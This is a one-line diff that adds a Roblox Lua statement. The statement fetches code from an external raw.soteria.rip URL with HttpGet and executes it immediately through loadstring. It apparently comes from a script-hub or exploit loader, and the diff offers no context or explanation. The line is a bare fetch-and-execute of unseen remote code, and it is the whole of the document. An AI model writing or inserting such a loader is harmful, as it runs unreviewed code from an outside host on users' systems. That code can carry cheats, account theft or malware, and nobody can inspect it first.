@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.soteria.rip/04e0aa709b442df5d0a3373645a9a36b"))()
